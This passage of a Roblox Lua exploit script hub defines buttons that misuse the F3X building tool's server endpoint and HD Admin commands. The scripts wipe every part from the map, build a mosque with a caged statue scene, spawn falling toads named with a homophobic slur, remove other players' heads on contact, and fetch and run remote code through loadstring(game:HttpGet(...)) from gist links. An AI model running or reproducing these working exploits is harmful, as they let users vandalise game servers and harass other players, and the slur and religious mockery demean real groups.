        if extra then extra(p) end
    end)
end

-- CLEAR MAP
for _,v in ipairs(workspace:GetDescendants()) do
    if v:IsA("BasePart") or v:IsA("UnionOperation") then
        fastInvoke({"Remove",{v}})
    end
end
task.wait(1)

-- BUILD MOSQUE
local function buildMosque()
    local floorSize = Vector3.new(180,1,130)
    local floorCF = CFrame.new(-23.874,0.5,11.852)
    quickPart("Normal",floorCF,floorSize,Enum.Material.Concrete,Color3.fromRGB(200,200,200),nil,nil,nil,nil,setLock)

    local h,th = 24,2
    quickPart("Normal",CFrame.new(-23.874,12.5,11.852+65-1),Vector3.new(180,h,th),Enum.Material.Concrete,nil,nil,nil,nil,nil,setLock)
    quickPart("Normal",CFrame.new(-23.874,12.5,11.852-65+1),Vector3.new(180,h,th),Enum.Material.Concrete,nil,nil,nil,nil,nil,setLock)
    quickPart("Normal",CFrame.new(-23.874+90-1,12.5,11.852),Vector3.new(th,h,130),Enum.Material.Concrete,nil,nil,nil,nil,nil,setLock)
    quickPart("Normal",CFrame.new(-23.874-90+1,12.5,11.852),Vector3.new(th,h,130),Enum.Material.Concrete,nil,nil,nil,nil,nil,setLock)

    quickPart("Spawn",CFrame.new(20.371,1,12.897),Vector3.new(1,1,1))
end

-- FOUNTAIN
local function addWaterFountain()
    local c = Vector3.new(-24,1,11)
    local b = CFrame.new(c.X,1.5,c.Z)
    quickPart("Normal",b,Vector3.new(25,1,25),Enum.Material.Marble,Color3.fromRGB(220,220,255),nil,nil,nil,nil,setLock)
    quickPart("Normal",b+Vector3.new(0,0.9,0),Vector3.new(22,0.8,22),Enum.Material.SmoothPlastic,Color3.fromRGB(80,140,255),0,nil,nil,nil,setLock)
end

-- POSTERS
local function addRulesPoster()
    local p1,p2 = "83022346908747","109515346551244"
    local h,w,t = 25,40,3.5
    local y = 0.5 + h/2

    local rx = -23.874 + 90 - 1
    quickPart("Normal",CFrame.new(rx-2,y,11.92),Vector3.new(t,h,w),nil,Color3.new(1,1,1),0,nil,nil,nil,function(p)
        setCollision(p,false)
        createDecal(p,Enum.NormalId.Left)
        setDecal(p,Enum.NormalId.Left,p1)
        setLock(p)
    end)

    local bz = 11.852 + 65 - 1
    quickPart("Normal",CFrame.new(-23.874,y,bz-2),Vector3.new(w,h,t),nil,Color3.new(1,1,1),0,nil,nil,nil,function(p)
        setCollision(p,false)
        createDecal(p,Enum.NormalId.Front)
        setDecal(p,Enum.NormalId.Front,p2)
        setLock(p)
    end)
end

-- ORIGINAL STATUES BY POSTER
local function addStatueFrontBackPoster()
    local floorY = 0.5
    local statueSize = Vector3.new(3,3,3)
    local meshScale = Vector3.new(1,1,1)
    local backWallZ = 11.852 + 65 - 1
    local forwardGap = 1.4
    local hardLift = 2

    local statueCF = CFrame.new(-23.874, floorY + statueSize.Y/2 + hardLift, backWallZ - 3.5 - statueSize.Z/2 - forwardGap) *
    CFrame.Angles(0, math.rad(180), 0)

    quickPart("Normal", statueCF, statueSize, Enum.Material.Marble, Color3.fromRGB(255,255,255), 0, "122860170730679", "119266289771828", meshScale, setLock)
end

local function addStatueNextToFirst()
    local floorY = 0.5
    local statueSize = Vector3.new(3,3,3)
    local meshScale = Vector3.new(1,1,1)
    local backWallZ = 11.852 + 65 - 1
    local forwardGap = 1.4
    local hardLift = 2
    local sideOffset = 12

    local statueCF = CFrame.new(-23.874 + sideOffset, floorY + statueSize.Y/2 + hardLift, backWallZ - 3.5 - statueSize.Z/2 - forwardGap) *
    CFrame.Angles(0, math.rad(180), 0)

    quickPart("Normal", statueCF, statueSize, Enum.Material.Marble, Color3.fromRGB(255,255,255), 0, "84304099730980", "119750131991922", meshScale, setLock)
end

-- JAIL CAGE + RAISED STATUES
local function addJailCageFrontWall()
    local floorY = 0.5
    local cageHeight = 20
    local cageWidth = 20
    local cageThickness = 0.5
    local barSpacing = 2
    local frontWallZ = 11.852 - 65 + 1
    local cageZ = frontWallZ + cageWidth/2
    local cageCF = CFrame.new(-23.874, floorY + cageHeight/2, cageZ)

    for x = -cageWidth/2 + cageThickness/2, cageWidth/2 - cageThickness/2, barSpacing do
        quickPart("Normal", cageCF + Vector3.new(x,0,cageWidth/2), Vector3.new(cageThickness,cageHeight,cageThickness), Enum.Material.Metal, Color3.fromRGB(150,150,150), 0, nil, nil, nil, setLock)
        quickPart("Normal", cageCF + Vector3.new(x,0,-cageWidth/2), Vector3.new(cageThickness,cageHeight,cageThickness), Enum.Material.Metal, Color3.fromRGB(150,150,150), 0, nil, nil, nil, setLock)
    end

    for z = -cageWidth/2 + cageThickness/2, cageWidth/2 - cageThickness/2, barSpacing do
        quickPart("Normal", cageCF + Vector3.new(cageWidth/2,0,z), Vector3.new(cageThickness,cageHeight,cageThickness), Enum.Material.Metal, Color3.fromRGB(150,150,150), 0, nil, nil, nil, setLock)
        quickPart("Normal", cageCF + Vector3.new(-cageWidth/2,0,z), Vector3.new(cageThickness,cageHeight,cageThickness), Enum.Material.Metal, Color3.fromRGB(150,150,150), 0, nil, nil, nil, setLock)
    end

    for x = -cageWidth/2 + cageThickness/2, cageWidth/2 - cageThickness/2, barSpacing do
        quickPart("Normal", cageCF + Vector3.new(x,cageHeight/2,0), Vector3.new(cageThickness,cageThickness,cageWidth), Enum.Material.Metal, Color3.fromRGB(150,150,150), 0, nil, nil, nil, setLock)
    end

    -- Add statues inside cage
    local statueSize = Vector3.new(3,3,3)
    local meshScale = Vector3.new(1,1,1)
    local raiseHeight = 2
    local cageStatues = {
        {offset = Vector3.new(-3,0,-3), meshId="125085454457585", texId="113977396211834"},
        {offset = Vector3.new(3,0,3), meshId="97775297968936", texId="130878283231247"},
    }

    for _, s in ipairs(cageStatues) do
        local cf = CFrame.new(
            cageCF.Position.X + s.offset.X,
            (cageCF.Position.Y - cageHeight/2) + statueSize.Y/2 + raiseHeight,
            cageCF.Position.Z + s.offset.Z
        )
        quickPart("Normal", cf, statueSize, Enum.Material.Marble, Color3.fromRGB(255,255,255), 0, s.meshId, s.texId, meshScale, setLock)
    end

    return cageCF, cageWidth, cageHeight
end

-- INVISIBLE BARRIER AROUND JAIL CAGE
local function addCageBarrier(cageCF, cageWidth, cageHeight)
    local barrierThickness = 1

    -- Front and back
    quickPart("Normal", cageCF + Vector3.new(0,0,cageWidth/2 + barrierThickness/2), Vector3.new(cageWidth + 4, cageHeight + 2, barrierThickness), nil, nil, 1, nil,nil,nil,setLock)
    quickPart("Normal", cageCF + Vector3.new(0,0,-cageWidth/2 - barrierThickness/2), Vector3.new(cageWidth + 4, cageHeight + 2, barrierThickness), nil, nil, 1, nil,nil,nil,setLock)

    -- Left and right
    quickPart("Normal", cageCF + Vector3.new(cageWidth/2 + barrierThickness/2,0,0), Vector3.new(barrierThickness, cageHeight + 2, cageWidth + 4), nil, nil, 1, nil,nil,nil,setLock)
    quickPart("Normal", cageCF + Vector3.new(-cageWidth/2 - barrierThickness/2,0,0), Vector3.new(barrierThickness, cageHeight + 2, cageWidth + 4), nil, nil, 1, nil,nil,nil,setLock)

    -- Top
    quickPart("Normal", cageCF + Vector3.new(0,cageHeight/2 + barrierThickness/2,0), Vector3.new(cageWidth + 4, barrierThickness, cageWidth + 4), nil, nil, 1, nil,nil,nil,setLock)
end

-- KRUSTY KRAB STATUE ORIGINAL POSITION
local function addKrabOriginal()
    quickPart(
        "Normal",
        CFrame.new(-77.241,15.9,8.652)*CFrame.Angles(0,math.rad(90),0),
        Vector3.new(1,1,1),
        nil,nil,nil,
        "1347582902","102576882741721",Vector3.new(0.2,0.2,0.2),
        setLock
    )
end

-- SKY FUNCTION
function Sky(id)
    local hrp = char:WaitForChild("HumanoidRootPart")
    local cf = hrp.CFrame

    CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)

    for _, v in workspace:GetDescendants() do
        if v:IsA("BasePart") and (v.Position - (cf.Position + Vector3.new(0,6,0))).Magnitude < 1 then
            SetAnchor(v, true)
            AddMesh(v)
            SetMesh(v, "111891702759441") -- Sphere mesh
            SetTexture(v, id)
            SetVertexColor(v, Vector3.new(5,5,5))
            MeshResize(v, Vector3.new(109888,109888,109888))
        end
    end
end

-- RUN ALL
buildMosque()
task.wait(1)
addWaterFountain()
task.wait(1)
addRulesPoster()
task.wait(1)
addStatueFrontBackPoster()
task.wait(1)
addStatueNextToFirst()
task.wait(1)
local cageCF, cageWidth, cageHeight = addJailCageFrontWall()
task.wait(1)
addCageBarrier(cageCF, cageWidth, cageHeight)
task.wait(1)
addKrabOriginal()
task.wait(1)

-- SKY
pcall(function()
    Sky("138982388144695") -- Replace with your mosque skybox texture ID
end)

-- MUSIC
pcall(function()
    ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent
    :InvokeServer(";music 117137820246363 ;pitch .1 ;volume inf")
end)

task.wait(1)

-- RESET
pcall(function()
    ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent
    :InvokeServer(";res all")
end)
    end
})
AddButton({
    Name = "RoXploit Tacos",
    Callback = function()
        -- DO NOT DELETE THIS LEAVE MY CREDIT
-- Rain Toad Script (QuickPart / F3X Fast Builder version)
-- Original idea by ItsKittyyyGD, adapted to QuickPart system

-- SERVICES
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local backpack = player:WaitForChild("Backpack")

-- GET F3X (NO BTOOLS / NO PUNISH)
local function getf3x()
    for _, v in ipairs(backpack:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then return v end
    end
    for _, v in ipairs(char:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then return v end
    end
end

local f3x = getf3x()
if not f3x then
    warn("No F3X found")
    return
end

local endpoint = f3x.SyncAPI.ServerEndpoint

-- FAST INVOKE
local function fastInvoke(args)
    task.spawn(function()
        pcall(function()
            endpoint:InvokeServer(unpack(args))
        end)
    end)
end

-- QUICK PART
local function quickPart(t, cf, size, mat, col, trans, mid, mtex, mscale, extra)
    task.spawn(function()
        local p = endpoint:InvokeServer("CreatePart", t, cf, workspace.Terrain)
        if not p then return end

        fastInvoke({"SyncResize", {{
            Part = p,
            CFrame = cf,
            Size = size
        }}})

        if mat then
            fastInvoke({"SyncMaterial", {{Part = p, Material = mat}}})
        end

        if col then
            fastInvoke({"SyncColor", {{Part = p, Color = col, UnionColoring = false}}})
        end

        if trans then
            fastInvoke({"SyncMaterial", {{Part = p, Transparency = trans}}})
        end

        if mid or mtex or mscale then
            fastInvoke({"CreateMeshes", {{Part = p}}})
            if mid then
                fastInvoke({"SyncMesh", {{Part = p, MeshId = "rbxassetid://" .. mid}}})
            end
            if mtex then
                fastInvoke({"SyncMesh", {{Part = p, TextureId = "rbxassetid://" .. mtex}}})
            end
            if mscale then
                fastInvoke({"SyncMesh", {{Part = p, Scale = mscale}}})
            end
        end

        if extra then
            extra(p)
        end
    end)
end

-- =========================
-- RAIN TOADS CONFIG
-- =========================
math.randomseed(tick())

local TOAD_MESH   = "14846869"
local TOAD_TEX    = "14846834"
local TOAD_SCALE  = Vector3.new(15, 15, 15)
local TOAD_SIZE   = Vector3.new(50, 50, 30)

-- =========================
-- RAIN TOADS LOOP
-- =========================
local function rainToads()
    while true do
        task.wait(0.01)

        local c = player.Character
        local hum = c and c:FindFirstChildOfClass("Humanoid")
        local hrp = c and c:FindFirstChild("HumanoidRootPart")

        if not (hum and hrp and hum.Health > 0) then
            task.wait(1)
            continue
        end

        local basePos = hrp.Position
        local rx = math.random(-600, 600)
        local rz = math.random(-600, 600)

        local x = math.floor(basePos.X + rx)
        local z = math.floor(basePos.Z + rz)
        local y = basePos.Y + math.random(400, 800)

        local cf = CFrame.new(x, y, z)

        quickPart(
            "Normal",
            cf,
            TOAD_SIZE,
            Enum.Material.Plastic,
            Color3.new(1,1,1),
            0,
            TOAD_MESH,
            TOAD_TEX,
            TOAD_SCALE,
            function(p)
                fastInvoke({"SyncAnchor", {{Part = p, Anchored = false}}})
                fastInvoke({"SyncCollision", {{Part = p, CanCollide = true}}})
                fastInvoke({"SetName", {{p}}, "Get trolled u fagz"})

                p.Orientation = Vector3.new(0,0,0)

                local s = Instance.new("Sound", p)
                s.SoundId = "rbxassetid://153752123"
                s.Volume = 0
                s.PlayOnRemove = true
                s:Destroy()
            end
        )
    end
end

coroutine.wrap(rainToads)()
    end
})
AddButton({
    Name = "Goner",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
local rq = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
local RunService = game:GetService("RunService")




local player = game.Players.LocalPlayer
    local char = player.Character
    local tool
char.Animate.Disabled = true
    for i,v in player:GetDescendants() do
        if v.Name == "SyncAPI" then
            tool = v.Parent
        end
    end
    for i,v in game.ReplicatedStorage:GetDescendants() do
        if v.Name == "SyncAPI" then
            tool = v.Parent
        end
    end
    --craaa
    for i,v in char:GetDescendants() do
        if v:IsA("BasePart") then
          v.Anchored = true
        end
    end
    remote = tool.SyncAPI.ServerEndpoint
    function _(args)
spawn(function()
        remote:InvokeServer(unpack(args))
end)
    end
    function SetCollision(part,boolean)
        local args = {
            [1] = "SyncCollision",
            [2] = {
                [1] = {
                    ["Part"] = part,
                    ["CanCollide"] = boolean
                }
            }
        }
        _(args)
    end
    function SetAnchor(boolean,part)
        local args = {
            [1] = "SyncAnchor",
            [2] = {
                [1] = {
                    ["Part"] = part,
                    ["Anchored"] = boolean
                }
            }
        }
        _(args)
    end
    function CreatePart(cf,parent)
        local args = {
            [1] = "CreatePart",
            [2] = "Normal",
            [3] = cf,
            [4] = parent
        }
        _(args)
    end
    function DestroyPart(part)
        local args = {
            [1] = "Remove",
            [2] = {
                [1] = part
            }
        }
        _(args)
    end
    function MovePart(part,cf)
        local args = {
            [1] = "SyncMove",
            [2] = {
                [1] = {
                    ["Part"] = part,
                    ["CFrame"] = cf
                }
            }
        }
        _(args)
    end
    function Resize(part,size,cf)
        local args = {
            [1] = "SyncResize",
            [2] = {
                [1] = {
                    ["Part"] = part,
                    ["CFrame"] = cf,
                    ["Size"] = size
                }
            }
        }
        _(args)
    end
    function AddMesh(part)
        local args = {
            [1] = "CreateMeshes",
            [2] = {
                [1] = {
                    ["Part"] = part
                }
            }
        }
        _(args)
    end
    function reflect(part,int)
        local args = {
            [1] = "SyncMaterial",
            [2] = {
                [1] = {
                    ["Part"] = part,
                    ["Reflectance"] = int
                }
            }
        }
        _(args)
    end
    function SetMesh(part,meshid)
        local args = {
            [1] = "SyncMesh",
            [2] = {
                [1] = {
                    ["Part"] = part,
                    ["MeshId"] = "rbxassetid://"..meshid
                }
            }
        }
        _(args)
    end
    function vect(part,of)
        local args = {
            [1] = "SyncMesh",
            [2] = {
                [1] = {
                    ["Part"] = part,
                    ["Offset"] = of
                }
            }
        }
        _(args)
    end
    function SetTexture(part, texid)
        local args = {
            [1] = "SyncMesh",
            [2] = {
                [1] = {
                    ["Part"] = part,
                    ["TextureId"] = "rbxassetid://"..texid
                }
            }
        }
        _(args)
    end
    function SetName(part, stringg)
        local args = {
            [1] = "SetName",
            [2] = {
                [1] = part
            },
            [3] = stringg
        }

        _(args)
    end
    function MeshResize(part,size)
        local args = {
            [1] = "SyncMesh",
            [2] = {
                [1] = {
                    ["Part"] = part,
                    ["Scale"] = size
                }
            }
        }
        _(args)
    end
function MeshColor(part,color)
local args = {
	"SyncMesh",
	{
		{
			Part = part,
			VertexColor = color 
		}
	}
}
_(args)
    end
    function Weld(part1, part2,lead)
        local args = {
            [1] = "CreateWelds",
            [2] = {
                [1] = part1,
                [2] = part2
            },
            [3] = lead
        }
        _(args)

    end
    function SetLocked(part,boolean)
        local args = {
            [1] = "SetLocked",
            [2] = {
                [1] = part
            },
            [3] = boolean
        }
        _(args)
    end

    function SetTrans(part,int)
        local args = {
            [1] = "SyncMaterial",
            [2] = {
                [1] = {
                    ["Part"] = part,
                    ["Transparency"] = int
                }
            }
        }
        _(args)
    end
function Setmate(part,int)
        local args = {
            [1] = "SyncMaterial",
            [2] = {
                [1] = {
                    ["Part"] = part,
                    ["Material"] = int
                }
            }
        }
        _(args)
    end
    function CreateSpotlight(part)
        local args = {
            [1] = "CreateLights",
            [2] = {
                [1] = {
                    ["Part"] = part,
                    ["LightType"] = "SpotLight"
                }
            }
        }
        _(args)
    end
    function SyncLighting(part,brightness)
        local args = {
            [1] = "SyncLighting",
            [2] = {
                [1] = {
                    ["Part"] = part,
                    ["LightType"] = "SpotLight",
                    ["Brightness"] = brightness
                }
            }
        }
        _(args)
    end
    function Color(part,color)
        local args = {
            [1] = "SyncColor",
            [2] = {
                [1] = {
                    ["Part"] = part,
                    ["Color"] = color --[[Color3]],
                    ["UnionColoring"] = false
                }
            }
        }
        _(args)
    end
    function SpawnDecal(part,side)
        local args = {
            [1] = "CreateTextures",
            [2] = {
                [1] = {
                    ["Part"] = part,
                    ["Face"] = side,
                    ["TextureType"] = "Decal"
                }
            }
        }

        _(args)
    end
    function AddDecal(part,asset,side)
        local args = {
            [1] = "SyncTexture",
            [2] = {
                [1] = {
                    ["Part"] = part,
                    ["Face"] = side,
                    ["TextureType"] = "Decal",
                    ["Texture"] = "rbxassetid://".. asset
                }
            }
        }
        _(args)
    end
    for i,v in char:GetDescendants() do
        if v:IsA("BasePart") then
            spawn(function()
            SetTrans(v,1)
            end)
        end
    end
    cf=CFrame.new()
local larm = char["Left Arm"]
local rarm = char["Right Arm"]
local lleg = char["Left Leg"]
local rleg = char["Right Leg"]
local trs= char.Torso
local hd = char.Head

nlarm = remote:InvokeServer("CreatePart","Normal",cf,char)
nrarm = remote:InvokeServer("CreatePart","Normal",cf,char)
nlleg = remote:InvokeServer("CreatePart","Normal",cf,char)
nrleg = remote:InvokeServer("CreatePart","Normal",cf,char)
ntrs = remote:InvokeServer("CreatePart","Normal",cf,char)
nhd = remote:InvokeServer("CreatePart","Normal",cf,char)
sword = remote:InvokeServer("CreatePart","Normal",cf,char)

spawn(function()
Resize(nlarm, larm.Size, larm.CFrame)
end)
spawn(function()
Resize(sword, Vector3.new(0.2,1.8,5.9), CFrame.new(rarm.Position - Vector3.new(0, 1.3, 0)) * CFrame.Angles(0, math.rad(-90),0))
end)
spawn(function()
Resize(nrarm, rarm.Size, rarm.CFrame)
end)
spawn(function()
Resize(nlleg, lleg.Size, lleg.CFrame)
end)
spawn(function()
Resize(nrleg, rleg.Size, rleg.CFrame)
end)
spawn(function()
Resize(ntrs, trs.Size, trs.CFrame)
end)
spawn(function()
Resize(nhd, hd.Size, hd.CFrame)
end)



RunService.Heartbeat:connect(function(deltaTime)

local smoothFactor = math.clamp(deltaTime * 10, 0, 1)
     hd1 = hd.CFrame:Lerp(hd.CFrame, smoothFactor)
     trs1 = trs.CFrame:Lerp(trs.CFrame, smoothFactor)
     larm1 = larm.CFrame:Lerp(larm.CFrame, smoothFactor)
     rarm1 = rarm.CFrame:Lerp(rarm.CFrame, smoothFactor)
     lleg1 = lleg.CFrame:Lerp(lleg.CFrame, smoothFactor)
     rleg1 = rleg.CFrame:Lerp(rleg.CFrame, smoothFactor)
     sword1 = char.Goner.Sword.CFrame:Lerp(char.Goner.Sword.CFrame, smoothFactor)

task.spawn(function()
MovePart(nhd,hd1)
end)
task.spawn(function()
MovePart(ntrs,trs1)
end)
task.spawn(function()
MovePart(nlarm,larm1)
end)
task.spawn(function()
MovePart(nrarm,rarm1)
end)
task.spawn(function()
MovePart(nlleg,lleg1)
end)
task.spawn(function()
MovePart(nrleg,rleg1)
end)
task.spawn(function()
MovePart(sword,sword1)
end)
end)

spawn(function()
Color(nlarm, Color3.new(0,0,0))
end)
spawn(function()
Color(nrarm, Color3.new(0,0,0))
end)
spawn(function()
Color(nlleg, Color3.new(0,0,0))
end)
spawn(function()
Color(nrleg, Color3.new(0,0,0))
end)
spawn(function()
Color(ntrs, Color3.new(0,0,0))
end)
spawn(function()
Color(nhd, Color3.new(0,0,0))
end)
spawn(function()
Color(sword, Color3.new(0,0,0))
end)

spawn(function()
Setmate(nlarm, Enum.Material.Slate)
end)
spawn(function()
Setmate(nrarm, Enum.Material.Slate)
end)
spawn(function()
Setmate(nlleg, Enum.Material.Slate)
end)
spawn(function()
Setmate(nrleg, Enum.Material.Slate)
end)
spawn(function()
Setmate(ntrs, Enum.Material.Slate)
end)
spawn(function()
Setmate(nhd, Enum.Material.Slate)
end)
spawn(function()
DestroyPart(char.Head.face)
end)

spawn(function()
SetCollision(nlarm, false)
end)
spawn(function()
SetCollision(nrarm, false)
end)
spawn(function()
SetCollision(nlleg, false)
end)
spawn(function()
SetCollision(nrleg, false)
end)
spawn(function()
SetCollision(ntrs, false)
end)
spawn(function()
SetCollision(nhd, false)
end)
spawn(function()
SetCollision(sword, false)
end)


spawn(function()
AddMesh(nhd)
end)
spawn(function()
SetMesh(nhd,"17769704541")
end)
spawn(function()
SetTexture(nhd,"17770031648")
end)
spawn(function()
vect(nhd, Vector3.new(0,0.2,0))
end)

spawn(function()
AddMesh(nlarm)
end)
spawn(function()
SetMesh(nlarm,"127739625807358")
end)

spawn(function()
AddMesh(nrarm)
end)
spawn(function()
SetMesh(nrarm,"127739625807358")
end)
spawn(function()
AddMesh(ntrs)
end)
spawn(function()
SetMesh(ntrs,"2027989253")
end)
spawn(function()
AddMesh(nlleg)
end)
spawn(function()
SetMesh(nlleg,"127739625807358")
end)
spawn(function()
AddMesh(nrleg)
end)
spawn(function()
SetMesh(nrleg,"127739625807358")
end)

spawn(function()
AddMesh(sword)
end)
spawn(function()
SetMesh(sword,"500489601")
end)
spawn(function()
MeshResize(sword,Vector3.new(0.014,0.008,0.008))
end)

spawn(function()
loadstring(game:HttpGet("https://gist.github.com/Kotyara19k-Doorsspawner/fe522f8aef5e51bec893a04cca6a8132/raw/2926ee37debdc7baf95e10031aea7911106d930b/Goneranims"))()
end)

    for i,v in char:GetDescendants() do
        if v:IsA("BasePart") then
          v.Anchored = false
        end
    end
    -- dont remove --, its the trail script but it lags the game, maybe you can fix it
--loadstring(game:HttpGet('https://gist.github.com/Kotyara19k-Doorsspawner/d0b855691c79c301efdf90183bc47abc/raw/f9cc8ccab1a3cb60ad3f828f072cd8bbe7f0c94c/gonertrail'))()

    end
})
AddButton({
    Name = "Thomas",
    Callback = function()
        -- DO NOT DELETE THIS LEAVE MY CREDIT
-- Thomas Builder Script (QuickPart / F3X Fast Builder)
-- Original idea by ItsKittyyyGD, adapted to QuickPart system

-- SERVICES
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local backpack = player:WaitForChild("Backpack")

-- GET F3X
local function getf3x()
for _, v in ipairs(backpack:GetChildren()) do
if v:FindFirstChild("SyncAPI") then return v end
end
for _, v in ipairs(char:GetChildren()) do
if v:FindFirstChild("SyncAPI") then return v end
end
end

local f3x = getf3x()
if not f3x then
warn("No F3X found")
return
end

local endpoint = f3x.SyncAPI.ServerEndpoint

-- FAST INVOKE
local function fastInvoke(args)
task.spawn(function()
pcall(function()
endpoint:InvokeServer(unpack(args))
end)
end)
end

-- QUICK PART
local function quickPart(t, cf, size, mat, col, trans, mid, mtex, mscale, extra)
task.spawn(function()
local p = endpoint:InvokeServer("CreatePart", t, cf, workspace.Terrain)
if not p then return end

fastInvoke({"SyncResize", {{
Part = p,
CFrame = cf,
Size = size
}}})

if mat then fastInvoke({"SyncMaterial", {{Part = p, Material = mat}}}) end
if col then fastInvoke({"SyncColor", {{Part = p, Color = col, UnionColoring = false}}}) end
if trans then fastInvoke({"SyncMaterial", {{Part = p, Transparency = trans}}}) end

if mid or mtex or mscale then
fastInvoke({"CreateMeshes", {{Part = p}}})
if mid then fastInvoke({"SyncMesh", {{Part = p, MeshId = "rbxassetid://" .. mid}}}) end
if mtex then fastInvoke({"SyncMesh", {{Part = p, TextureId = "rbxassetid://" .. mtex}}}) end
if mscale then fastInvoke({"SyncMesh", {{Part = p, Scale = mscale}}}) end
end

if extra then extra(p) end

end)

end

-- =========================
-- THOMAS CONFIG
-- =========================
local THOMAS_MESH  = "2231280549"
local THOMAS_TEX   = "2231280614"
local THOMAS_SCALE = Vector3.new(2, 2, 1.5)
local THOMAS_SIZE  = Vector3.new(5, 5, 10)

-- =========================
-- INVISIBILITY FUNCTION
-- =========================
local function setInvisibility()
task.spawn(function()
local parts = {"Torso", "Left Leg", "Right Leg", "Left Arm", "Right Arm", "Head", "HumanoidRootPart"}
local args = { [1] = "SyncMaterial", [2] = {} }

for i, name in ipairs(parts) do
local part = char:FindFirstChild(name)
if part then
table.insert(args[2], {Part = part, Transparency = 1})
end
end

fastInvoke(args)

end)

end

-- =========================
-- BUILD THOMAS
-- =========================
local function buildThomas()
local hrp = char:FindFirstChild("HumanoidRootPart")
if not hrp then return end

-- Take a snapshot of HRP's position to avoid offsets while moving
local spawnCF = hrp.CFrame

quickPart(
"Normal",
spawnCF,
THOMAS_SIZE,
Enum.Material.Plastic,
Color3.fromRGB(255,255,255),
0,
THOMAS_MESH,
THOMAS_TEX,
THOMAS_SCALE,
function(p)
-- Temporarily anchor to prevent movement glitches
fastInvoke({"SyncAnchor", {{Part = p, Anchored = true}}})
fastInvoke({"SyncCollision", {{Part = p, CanCollide = false}}})
fastInvoke({"SetLocked", {p}, false})
fastInvoke({"SetName", {{p}}, "Thomas"})
fastInvoke({"CreateWelds", {p, hrp}, p})
fastInvoke({"CreateLights", {{Part = p, LightType = "SpotLight"}}})
fastInvoke({"SyncLighting", {{Part = p, LightType = "SpotLight", Brightness = 100}}})

-- Remove anchor after weld is created
task.delay(0.05, function()
fastInvoke({"SyncAnchor", {{Part = p, Anchored = false}}})
end)

-- Touch effect: destroy other players' heads & play whistle          
p.Touched:Connect(function(hit)          
    local hitChar = hit.Parent          
    if hitChar and hitChar:IsA("Model") and Players:FindFirstChild(hitChar.Name) then          
        if hitChar.Name ~= player.Name then          
            local targetHead = hitChar:FindFirstChild("Head")          
            if targetHead then          
                fastInvoke({"Remove", {targetHead}})          
            end          
            local whistle = Instance.new("Sound", p)          
            whistle.SoundId = "rbxassetid://475073913"          
            whistle.Volume = 1          
            whistle:Play()          
        end          
    end          
end)

end

)

-- Increase humanoid speed & disable collisions
local hum = char:FindFirstChildOfClass("Humanoid")
if hum then hum.WalkSpeed = 80 end

RunService.RenderStepped:Connect(function()
for _, v in ipairs(char:GetDescendants()) do
if v:IsA("BasePart") then
v.CanCollide = false
end
end
end)

end

-- =========================
-- SPAWN THOMAS
-- =========================
setInvisibility()
buildThomas()
    end
})

AddButton({
    Name = "Thomas Others",
    Callback = function()
        -- DO NOT DELETE THIS LEAVE MY CREDIT
-- Thomas Mass Transform Script (Everyone Except You)
local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local SilentRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
        SilentRequest:InvokeServer(";speed all 80")
-- SERVICES
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local backpack = player:WaitForChild("Backpack")

-- GET F3X
local function getf3x()
    for _, v in ipairs(backpack:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then return v end
    end
    for _, v in ipairs(char:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then return v end
    end
end

local f3x = getf3x()
if not f3x then
    warn("No F3X found")
    return
end

local endpoint = f3x.SyncAPI.ServerEndpoint

-- FAST INVOKE
local function fastInvoke(args)
    task.spawn(function()
        pcall(function()
            endpoint:InvokeServer(unpack(args))
        end)
    end)
end

-- QUICK PART (THOMAS CREATION)
local function quickPart(t, cf, size, mat, col, trans, mid, mtex, mscale, extra)
    task.spawn(function()
        local p = endpoint:InvokeServer("CreatePart", t, cf, Workspace.Terrain)
        if not p then return end

        fastInvoke({"SyncResize", {{Part = p, CFrame = cf, Size = size}}})
        if mat then fastInvoke({"SyncMaterial", {{Part = p, Material = mat}}}) end
        if col then fastInvoke({"SyncColor", {{Part = p, Color = col, UnionColoring = false}}}) end
        if trans then fastInvoke({"SyncMaterial", {{Part = p, Transparency = trans}}}) end
        if mid or mtex or mscale then
            fastInvoke({"CreateMeshes", {{Part = p}}})
            if mid then fastInvoke({"SyncMesh", {{Part = p, MeshId = "rbxassetid://" .. mid}}}) end
            if mtex then fastInvoke({"SyncMesh", {{Part = p, TextureId = "rbxassetid://" .. mtex}}}) end
            if mscale then fastInvoke({"SyncMesh", {{Part = p, Scale = mscale}}}) end
        end
        if extra then extra(p) end
    end)
end

-- THOMAS CONFIG
local THOMAS_MESH  = "2231280549"
local THOMAS_TEX   = "2231280614"
local THOMAS_SCALE = Vector3.new(2, 2, 1.5)
local THOMAS_SIZE  = Vector3.new(5, 5, 10)

-- INVISIBILITY FUNCTION
local function setInvisibility(targetChar)
    task.spawn(function()
        local parts = {"Torso", "Left Leg", "Right Leg", "Left Arm", "Right Arm", "Head", "HumanoidRootPart"}
        local args = { [1] = "SyncMaterial", [2] = {} }

        for _, name in ipairs(parts) do
            local part = targetChar:FindFirstChild(name)
            if part then
                table.insert(args[2], {Part = part, Transparency = 1})
            end
        end

        fastInvoke(args)
    end)
end

-- BUILD THOMAS FUNCTION
local function buildThomas(targetChar)
    local hrp = targetChar:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    local spawnCF = hrp.CFrame

    quickPart(
        "Normal",
        spawnCF,
        THOMAS_SIZE,
        Enum.Material.Plastic,
        Color3.fromRGB(255,255,255),
        0,
        THOMAS_MESH,
        THOMAS_TEX,
        THOMAS_SCALE,
        function(p)
